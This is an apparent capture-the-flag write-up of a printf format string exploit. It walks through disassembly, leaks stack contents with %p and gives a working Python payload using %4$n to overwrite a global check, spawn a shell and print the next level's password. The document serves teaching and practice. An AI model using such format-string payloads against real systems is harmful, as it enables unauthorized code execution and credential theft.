# PRINTF FORMAT STRING VULNERABILITY (WRITING WITH %n)

```asm
0804851a <main>:
 804851a:	55                   	push   ebp
 804851b:	89 e5                	mov    ebp,esp
 804851d:	83 e4 f0             	and    esp,0xfffffff0
 8048520:	e8 7f ff ff ff       	call   80484a4 <v>
 8048525:	c9                   	leave  
 8048526:	c3                   	ret    
 8048527:	90                   	nop
```
Its basically calling the v function

```asm
080484a4 <v>:
 80484a4:	55                   	push   ebp
 80484a5:	89 e5                	mov    ebp,esp
 80484a7:	81 ec 18 02 00 00    	sub    esp,0x218
 80484ad:	a1 60 98 04 08       	mov    eax,ds:0x8049860
 80484b2:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80484b6:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
 80484bd:	00 
 80484be:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484c4:	89 04 24             	mov    DWORD PTR [esp],eax
 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
```
Like in the previous level, it reads our input into a buffer, but this time, the buffer writting is protecting in its lenght with fgets

```asm
 80484cc:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484d2:	89 04 24             	mov    DWORD PTR [esp],eax
 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
```
Printf uses our input as a format string, which is a vulnerability since the specifier %n allows us to write the number of bytes printed so far.

We can also use printf to read memory with the %p/%s specifiers debug easily where the format string is located in the stack frame of printf

In summary, now we can write values into the addresses we want, as soon as the format string is short enough to fit in the buffer fgets is using

```asm
 80484da:	a1 8c 98 04 08       	mov    eax,ds:0x804988c
 80484df:	83 f8 40             	cmp    eax,0x40
 80484e2:	75 34                	jne    8048518 <v+0x74>
 80484e4:	a1 80 98 04 08       	mov    eax,ds:0x8049880
 80484e9:	89 c2                	mov    edx,eax
 80484eb:	b8 00 86 04 08       	mov    eax,0x8048600
 80484f0:	89 54 24 0c          	mov    DWORD PTR [esp+0xc],edx
 80484f4:	c7 44 24 08 0c 00 00 	mov    DWORD PTR [esp+0x8],0xc
 80484fb:	00 
 80484fc:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
 8048503:	00 
 8048504:	89 04 24             	mov    DWORD PTR [esp],eax
 8048507:	e8 a4 fe ff ff       	call   80483b0 <fwrite@plt>
 804850c:	c7 04 24 0d 86 04 08 	mov    DWORD PTR [esp],0x804860d
 8048513:	e8 a8 fe ff ff       	call   80483c0 <system@plt>
```
If at 0x804988c the value is 64 (0x40), it opens a shell.

```
~$ ./level3
aaaa %p %p %p %p
aaaa 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161
```
The format string is located at the 4th argument of printf, so we can write 64 bytes then use %4$n to write the value 64 at this address (0x61616161) but we will substitute the 0x61616161 with the address of m (0x804988c) to write 64 at this address and open a shell

```
~$ python -c 'print "\x8c\x98\x04\x08" + "A"*(64-4) + "%4$n"' > /tmp/exploit4
~$ cat /tmp/exploit4 - | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
We put the address used to do the comparison with 64 in first, so at the 4th argument of printf, then we fill the buffer to 64 bytes (64-4 because we already put 4 bytes for the address), then we use %4$n to write the number of bytes printed so far (64) at the 4th argument of printf:
- it puts 64 at 0x804988c, then opens a shell